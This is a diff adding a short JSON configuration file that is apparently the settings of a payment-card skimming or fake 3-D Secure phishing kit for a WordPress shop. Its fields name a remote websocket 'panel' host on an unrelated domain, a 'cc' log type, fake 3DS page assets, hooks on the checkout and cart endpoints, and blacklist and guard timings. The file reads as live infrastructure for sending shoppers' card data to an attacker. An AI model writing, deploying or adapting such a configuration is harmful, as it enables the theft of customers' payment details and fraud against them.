@@ -1,0 +1,20 @@
+{
+  "panel_host": "wss://annangourmet.makeup",
+  "socket_path": "/socket.io/",
+  "logname": "WordPress",
+  "logtype": "cc",
+  "enable_verify": false,
+  "verify_endpoint": "/api/bp/verify",
+  "panel_direct": true,
+  "panel_direct_timeout": 2500,
+  "assets_base": "/bp/3ds/",
+  "runtime_url": "/bp/bp-template-runtime.js",
+  "template_base": "",
+  "submit_url": "/api/checkout",
+  "cart_url": "/api/cart",
+  "blacklist_wait_ms": 7000,
+  "debug": false,
+  "guard_mode": "always",
+  "guard_timeout_ms": 180000,
+  "allow_direct": false
+}
